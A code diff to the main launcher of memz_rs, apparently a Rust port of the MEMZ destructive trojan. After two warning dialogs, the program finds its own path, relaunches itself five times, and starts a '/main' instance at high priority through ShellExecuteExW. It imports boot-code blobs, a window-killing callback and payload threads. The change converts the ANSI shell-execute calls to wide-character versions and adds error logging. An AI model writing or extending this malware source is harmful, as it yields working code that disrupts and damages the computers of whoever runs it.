@@ -1,5 +1,5 @@
 use memz_rs::{
-    convert_str::{ToPCSTRWrapper},
+    convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper},
     data::{
         self,
         code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
@@ -9,10 +9,11 @@ use memz_rs::{
         callback::{kill_windows, window_proc},
         function::{payload_thread, N_PAYLOADS, PAYLOADS},
     },
+    s_v,
     utils::log::{self, write_log, LogLocation, LogType},
     winapi_type::DWORD,
     wrap_windows_api::*,
-    LMEM_ZEROINIT, s_v, MEM_ZEROINIT,
+    LMEM_ZEROINIT, MEM_ZEROINIT,
 };
 use std::{
     mem::size_of,
@@ -38,7 +39,9 @@ use windows::{
             Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
         },
         UI::{
-            Shell::{SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
+            Shell::{
+                ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA, SHELLEXECUTEINFOW,
+            },
             WindowsAndMessaging::{
                 CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                 HCURSOR, HICON, HMENU, IDYES, MB_ICONWARNING, MB_YESNO, MSG, SM_CXSCREEN,
@@ -125,22 +128,28 @@ fn main() -> Result<(), WinError> {
             };
         }
     } else {
-        if wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_1), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
-            || wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_2), "MEMZ", MB_YESNO | MB_ICONWARNING)?
-                != IDYES
+        if wrap_messagebox_a(
+            HWND(0),
+            s_v!(MEMZ_MSGBOXA_1),
+            "MEMZ",
+            MB_YESNO | MB_ICONWARNING,
+        )? != IDYES
+            || wrap_messagebox_a(
+                HWND(0),
+                s_v!(MEMZ_MSGBOXA_2),
+                "MEMZ",
+                MB_YESNO | MB_ICONWARNING,
+            )? != IDYES
         {
             process::exit(0);
         }
 
         let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
-        wrap_get_module_file_name(
-            HMODULE::default(),
-            &mut fn_buf,
-        )?;
+        wrap_get_module_file_name(HMODULE::default(), &mut fn_buf)?;
 
         let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
         let path = path.replace('\0', "");
-        
+
         for _ in 0..5 {
             wrap_shell_execute_w(
                 HWND(0),
@@ -152,18 +161,43 @@ fn main() -> Result<(), WinError> {
             )?;
         }
 
-        let info = SHELLEXECUTEINFOA {
-            cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
+        let mut info = SHELLEXECUTEINFOW {
+            cbSize: size_of::<SHELLEXECUTEINFOW>() as u32,
             fMask: SEE_MASK_NOCLOSEPROCESS,
             hwnd: HWND(0),
-            lpVerb: PCSTR::null(),
-            lpFile: *path.as_str().to_pcstr(),
-            lpParameters: *"/main".to_pcstr(),
-            lpDirectory: PCSTR::null(),
+            lpVerb: PCWSTR::null(),
+            lpFile: *path.as_str().to_pcwstr(),
+            lpParameters: *"/main".to_pcwstr(),
+            lpDirectory: PCWSTR::null(),
             nShow: SW_SHOWDEFAULT.0 as i32,
             hInstApp: HMODULE(0),
             ..Default::default()
         };
+
+        unsafe {
+            if ShellExecuteExW(&mut info).as_bool() {
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(
+                    LogType::INFO,
+                    LogLocation::MSG,
+                    "ShellExecuteExW successed"
+                );
+            } else {
+                #[cfg(feature = "DEBUG_MODE")]
+                write_log(
+                    LogType::ERROR,
+                    LogLocation::LOG,
+                    &format!(
+                        "Failed ShellExecuteExW()\nGetLastError: {:?}",
+                        GetLastError()
+                    ),
+                );
+                panic!(
+                    "Failed ShellExecuteExW()\nGetLastError: {:?}",
+                    GetLastError()
+                )
+            }
+        }
 
         wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;
 
